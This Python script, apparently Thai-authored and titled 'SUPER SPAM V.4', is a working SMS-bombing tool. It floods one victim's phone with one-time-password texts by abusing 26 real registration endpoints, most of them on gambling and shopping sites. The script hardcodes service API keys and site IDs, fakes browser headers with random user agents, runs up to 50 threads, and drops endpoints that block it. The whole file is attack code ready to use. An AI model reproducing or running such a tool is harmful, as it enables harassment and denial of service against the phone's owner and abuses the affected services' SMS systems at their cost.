# program/SMS-RUN.py
import requests
import threading
import time
import sys
import random
from fake_useragent import UserAgent

# ==========================================
# 🎨 API Configuration
# ==========================================
ua = UserAgent()

def get_common_headers(referer=None, origin=None, content_type="application/json"):
    headers = {
        "User-Agent": ua.random,
        "Accept": "*/*"
    }
    if referer:
        headers["Referer"] = referer
    if origin:
        headers["Origin"] = origin
    if content_type:
        headers["Content-Type"] = content_type
    return headers

API_CONFIG = {
    "api1": {
        "name": "Gogo-Shop",
        "url": "https://gogo-shop.com/app/index/send_sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gogo-shop.com/app/index/register", "https://gogo-shop.com", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"type=1&telephone={p}&select=66",
        "success_check": lambda r: '"code":1' in r
    },
    "api2": {
        "name": "Kex-Express",
        "url": "https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/{phone}",
        "method": "POST",
        "headers": lambda: {"Appid": "Website_Api", "Appkey": "fcdf0569-c2a1-4dee-bd22-9d5361c047f2", "User-Agent": ua.random, "Origin": "https://th.kex-express.com", "Referer": "https://th.kex-express.com/"},
        "data": None,
        "success_check": lambda r: '"code":200' in r
    },
    "api3": {
        "name": "Jaomuehuay",
        "url": "https://jaomuehuay.io/api/auth/send-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://jaomuehuay.io/register/jaomuehuay", "https://jaomuehuay.io"),
        "data": lambda p: {"phone_number": p, "affiliateCode": "jaomuehuay", "type": 1},
        "success_check": lambda r: '"Success":true' in r
    },
    "api4": {
        "name": "Jut8",
        "url": "https://www.jut8.com/api/user/request-register-tac",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.jut8.com/th-th?signup=1", "https://www.jut8.com"),
        "data": lambda p: {"uname": "", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": p, "language": "th", "langCountry": "th-th"},
        "success_check": lambda r: '"status":true' in r
    },
    "api5": {
        "name": "Cdo888",
        "url": "https://m.cdo888.bet/ajax/submitOTP",
        "method": "POST",
        "headers": lambda: get_common_headers("https://m.cdo888.bet/user/register", "https://m.cdo888.bet", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"send_otp={p}",
        "success_check": lambda r: '"status":"success"' in r
    },
    "api6": {
        "name": "Joneslot",
        "url": "https://www.joneslot.me/pussy888/otp.php?m=request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.joneslot.me/pussy888/register", "https://www.joneslot.me", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: '"errorCode":0' in r.replace(" ","") or '"status":"success"' in r
    },
    "api7": {
        "name": "Swin168",
        "url": "https://play.swin168.me/api/register/sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://play.swin168.me/register/", "https://play.swin168.me"),
        "data": lambda p: {"phone": p, "agent_id": 1, "country_code": "TH"},
        "success_check": lambda r: '"success"' in r
    },
    "api8": {
        "name": "Johnwick168",
        "url": "https://www.johnwick168.me/signup.php",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.johnwick168.me/signup.php", "https://www.johnwick168.me", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"act=step-1&tel={p}",
        "success_check": lambda r: 'err-' not in r and len(r) > 0
    },
    "api9": {
        "name": "Skyslot7",
        "url": "https://skyslot7.me/member/otp.php?m=request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://skyslot7.me/member/register", "https://skyslot7.me", "application/x-www-form-urlencoded; charset=UTF-8"),
        "data": lambda p: f"phone={p}",
        "success_check": lambda r: '"errorCode":0' in r.replace(" ","") or '"status":"success"' in r
    },
    "api10": {
        "name": "Mgi88",
        "url": "https://mgi88.me/api/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mgi88.me/", "https://mgi88.me"),
        "data": lambda p: {"telefon_number": p, "registrera_typ": ""},
        "success_check": lambda r: '"code":200' in r
    },
    "api11": {
        "name": "DeeCasino",
        "url": "https://play.dee.casino/api/register/sms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://play.dee.casino/register", "https://play.dee.casino"),
        "data": lambda p: {"phone": p, "agent_id": 1, "country_code": "TH"},
        "success_check": lambda r: '"success"' in r or '"status":true' in r
    },
    "api12": {
        "name": "Mgame666",
        "url": "https://gw.mgame666.com/AuthAPI/SendSms",
        "method": "POST",
        "headers": lambda: get_common_headers("https://okmega.pgm77.com/", "https://okmega.pgm77.com"),
        "data": lambda p: {"Phone": p},
        "success_check": lambda r: '"data":null' not in r
    },
    "api13": {
        "name": "Prompkai",
        "url": "https://api.prompkai.com/auth/preRegister",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.prompkai.com/", "https://www.prompkai.com"),
        "data": lambda p: {"username": p},
        "success_check": lambda r: '"error":false' in r.replace(" ", "")
    },
    "api14": {
        "name": "Fun24",
        "url": "https://www.fun24.bet/_ajax_/v3/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.fun24.bet/", "https://www.fun24.bet", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phoneNumber={p}",
        "success_check": lambda r: r.strip() == "[]" or '"success":true' in r
    },
    "api15": {
        "name": "Wm78bet",
        "url": "https://wm78bet.bet/_ajax_/v3/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wm78bet.bet/", "https://wm78bet.bet", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phoneNumber={p}",
        "success_check": lambda r: r.strip() == "[]"
    },
    "api16": {
        "name": "Happy168",
        "url": "https://m.happy168.xyz/api/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://m.happy168.xyz/?hid=V0H3O1B4TH", "https://m.happy168.xyz"),
        "data": lambda p: {"phone_number": p, "register_type": ""},
        "success_check": lambda r: '"code":200' in r
    },
    "api17": {
        "name": "Pgheng",
        "url": "https://pgheng.amaheng.com/api/otp?lang=th",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pgheng.amaheng.com/register?hid=T0F1K1A5RC", "https://pgheng.amaheng.com"),
        "data": lambda p: {"phone_number": p, "register_type": "", "type_otp": "register"},
        "success_check": lambda r: '"code":200' in r
    },
    "api18": {
        "name": "Aplusfun",
        "url": "https://www.aplusfun.bet/_ajax_/v3/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.aplusfun.bet/", "https://www.aplusfun.bet", "application/x-www-form-urlencoded"),
        "data": lambda p: f"phoneNumber={p}",
        "success_check": lambda r: r.strip() == "[]"
    },
    "api19": {
        "name": "Cueu77778887",
        "url": "https://api-players.cueu77778887.com/register-otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Origin": "https://lcbet44.electrikora.com", "Referer": "https://lcbet44.electrikora.com/", "X-Exp-Signature": "62b3e4c0138d8500127860d5", "Content-Type": "application/json"},
        "data": lambda p: {"brands_id": "62b3e4c0138d8500127860d5", "tel": p, "token": "", "captcha_id": "", "lot_number": "", "pass_token": "", "gen_time": "", "captcha_output": ""},
        "success_check": lambda r: "ดำเนินการสำเร็จ" in r
    },
    "api20": {
        "name": "Oneforbet",
        "url": "https://api.oneforbet.com/auth/player/phone-check",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Origin": "https://ohana888.net", "Referer": "https://ohana888.net/", "X-Site-Id": "26336fef-e961-449c-926d-93db6afef9c4", "X-Agency-Id": "df87f52d-4221-49b6-b6cb-827f92244b72", "Content-Type": "application/json; charset=UTF-8"},
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: '"status":"success"' in r
    },
    "api21": {
        "name": "Joker123ths",
        "url": "https://m.joker123ths.shop/api/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://m.joker123ths.shop/?hid=E0G3S1A4YH", "https://m.joker123ths.shop"),
        "data": lambda p: {"phone_number": p, "register_type": ""},
        "success_check": lambda r: '"code":200' in r
    },
    "api22": {
        "name": "Pigspin",
        "url": "https://jklmn23456.com/api/v1/user/phone/verify",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Origin": "https://pigspin.org", "Referer": "https://pigspin.org/", "Content-Type": "application/json"},
        "data": lambda p: {"phone_number": p},
        "success_check": lambda r: '"status":"SUCCESS"' in r
    },
    "api23": {
        "name": "i828th",
        "url": "https://www.i828th.com/api/user/request-register-tac",
        "method": "POST",
        "headers": lambda: {
            "Host": "www.i828th.com", "User-Agent": ua.random, "content-type": "application/json", "Origin": "https://www.i828th.com", "Referer": "https://www.i828th.com/th-th?signup=1",
            "Cookie": "prevUrl=https%3A%2F%2Fwww.google.com%2F; ipcountry=TH;" 
        },
        "data": lambda p: {"uname": f"66{p}", "sendType": "mobile", "country_code": "66", "currency": "THB", "mobileno": p, "language": "th", "langCountry": "th-th"},
        "success_check": lambda r: '"code":1' in r
    },
    "api24": {
        "name": "Thai191",
        "url": "https://www.thai191.com/api/user/request-register-tac",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"sendType": "mobile", "currency": "THB", "country_code": "66", "mobileno": p, "language": "th", "langCountry": "th-th"},
        "success_check": lambda r: '"code":1' in r
    },
    "api25": {
        "name": "Pgs42s",
        "url": "https://pgs42s.online/api/otp?lang=th",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/json"},
        "data": lambda p: {"phone_number": p, "register_type": "", "type_otp": "register"},
        "success_check": lambda r: '"success"' in r
    },
    "api26": {
        "name": "PgSlotIn",
        "url": "https://pgsoft.pgslotin.app/api/otp",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/json", "Origin": "https://pgsoft.pgslotin.app", "Referer": "https://pgsoft.pgslotin.app/"},
        "data": lambda p: {"phone_number": p, "register_type": ""},
        "success_check": lambda r: '"success"' in r
    }
}

# ==========================================
# 🎨 ตั้งค่าสี (Color System)
# ==========================================
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    C_GREEN = Fore.GREEN + Style.BRIGHT
    C_RED = Fore.RED + Style.BRIGHT
    C_YELLOW = Fore.YELLOW + Style.BRIGHT
    C_CYAN = Fore.CYAN + Style.BRIGHT
    C_WHITE = Fore.WHITE + Style.DIM
    C_RESET = Style.RESET_ALL
except ImportError:
    C_GREEN = C_RED = C_YELLOW = C_CYAN = C_WHITE = C_RESET = ""

# ==========================================
# ตั้งค่าความแรง
# ==========================================
MAX_THREADS = 50   
TIMEOUT_SEC = 8
MAX_RETRIES = 3

lock = threading.Lock()
success_total = 0

# เก็บสถานะ API: {api_name: fail_count}
api_fail_counts = {k: 0 for k in API_CONFIG.keys()}
banned_apis = set()

def clean_phone(phone):
    phone = "".join(filter(str.isdigit, phone.strip()))
    if phone.startswith("66"): return "0" + phone[2:]
    if phone.startswith("+66"): return "0" + phone[3:]
    return phone

def shoot_api(phone, api_key):
    global success_total
    
    # ถ้าโดนแบนไปแล้ว ไม่ต้องยิง
    if api_key in banned_apis: return

    cfg = API_CONFIG.get(api_key)
    if not cfg: return

    try:
        url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"]()
        data_input = cfg["data"](phone) if cfg["data"] else None
        
        kwargs = {"headers": headers, "timeout": TIMEOUT_SEC}
        if isinstance(data_input, dict): kwargs["json"] = data_input
        elif isinstance(data_input, str): kwargs["data"] = data_input

        response = requests.request(cfg["method"], url, **kwargs)
        
        # --- LOGIC วิเคราะห์ผลแบบฉลาด ---
        is_success = False
        should_ban = False
        
        # 1. เช็คความสำเร็จ
        if cfg.get("success_check"):
            if cfg["success_check"](response.text):
                is_success = True
        else:
            # Fallback ถ้าไม่มีตัวเช็ค
            if response.status_code in (200, 201) and "error" not in response.text.lower():
                is_success = True

        if is_success:
            with lock:
                success_total += 1
                # รีเซ็ตแต้มเสียเมื่อทำสำเร็จ
                api_fail_counts[api_key] = 0
                print(f"{C_GREEN}✅ ส่งสำเร็จ ({success_total}) | API: {cfg['name']}{C_RESET}")
        
        else:
            # ถ้าไม่สำเร็จ มาดูสาเหตุ
            status = response.status_code
            
            # กรณีที่ "ห้ามแบน" (แค่พัก)
            if status == 429: # ยิงถี่ไป
                return # จบรอบนี้เฉยๆ ไม่นับแต้มเสีย
            
            # กรณีที่ "แบนทันที" (ร้ายแรง)
            if status in (403, 401): # โดนบล็อก IP / Token ตาย
                should_ban = True
            
            # กรณีอื่นๆ (500, 400, 404) -> นับแต้มเสีย
            else:
                with lock:
                    api_fail_counts[api_key] += 1
                    if api_fail_counts[api_key] >= MAX_RETRIES:
                        should_ban = True

            if should_ban:
                with lock:
                    if api_key not in banned_apis:
                        print(f"{C_RED}💀 API {cfg['name']} ตายจริง (Status {status}) -> ตัดทิ้ง!{C_RESET}")
                        banned_apis.add(api_key)

    except Exception:
        # กรณี Network Error / Timeout -> นับแต้มเสีย
        with lock:
            api_fail_counts[api_key] += 1
            if api_fail_counts[api_key] >= MAX_RETRIES:
                if api_key not in banned_apis:
                    print(f"{C_RED}💀 API {cfg['name']} เชื่อมต่อไม่ได้เกิน {MAX_RETRIES} ครั้ง -> ตัดทิ้ง!{C_RESET}")
                    banned_apis.add(api_key)

def start_super_spam(phone, target_amount):
    print(f"\n{C_CYAN}🚀 SUPER SPAM V.4 (Smart Logic) ไปที่: {phone}{C_RESET}")
    print(f"{C_CYAN}🎯 เป้าหมายความสำเร็จ: {target_amount} ครั้ง{C_RESET}")
    print(f"{C_WHITE}💡 ระบบจะตัด API ทิ้งเมื่อพลาดติดต่อกัน {MAX_RETRIES} ครั้งเท่านั้น{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

    all_api_keys = list(API_CONFIG.keys())
    threads = []
    attempt_count = 0 
    
    while success_total < target_amount:
        # เลือกเฉพาะ API ที่ยังไม่โดนแบน
        active_apis = [k for k in all_api_keys if k not in banned_apis]
        
        if not active_apis:
            print(f"\n{C_RED}❌ ไม่มี API ที่ใช้งานได้เหลืออยู่เลย! (โดนแบนหมด){C_RESET}")
            break

        # วนใช้ API
        api_key = active_apis[attempt_count % len(active_apis)]
        
        # สร้าง Thread ยิง
        t = threading.Thread(target=shoot_api, args=(phone, api_key))
        threads.append(t)
        t.start()
        attempt_count += 1

        # คุมจำนวน Thread ไม่ให้เครื่องค้าง
        threads = [t for t in threads if t.is_alive()]
        while len(threads) >= MAX_THREADS:
            time.sleep(0.05)
            threads = [t for t in threads if t.is_alive()]
        
        time.sleep(0.01)

    # รอ Thread ที่เหลือทำงานให้จบ
    for t in threads: t.join()

    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")
    print(f"{C_GREEN}🏁 ภารกิจเสร็จสิ้น!{C_RESET}")
    print(f"✅ ยอดสำเร็จ: {C_GREEN}{success_total}/{target_amount}{C_RESET}")
    print(f"🔁 ยิงไปทั้งหมด: {attempt_count} ครั้ง")
    print(f"💀 API ที่ตายถาวร: {C_RED}{len(banned_apis)}{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

if __name__ == "__main__":
    try:
        phone_input = input(f"{C_YELLOW}📱 เบอร์โทรศัพท์: {C_RESET}")
        clean_p = clean_phone(phone_input)
        
        if len(clean_p) != 10:
            print(f"{C_RED}❌ เบอร์ไม่ถูกต้อง{C_RESET}")
            sys.exit()

        amount_input = input(f"{C_YELLOW}🔢 จำนวนความสำเร็จที่ต้องการ: {C_RESET}")
        amount = int(amount_input)

        start_super_spam(clean_p, amount)
        
    except ValueError:
        print(f"{C_RED}❌ ใส่ตัวเลขเท่านั้น{C_RESET}")
    except KeyboardInterrupt:
        print(f"\n{C_RED}⛔ ยกเลิก{C_RESET}")
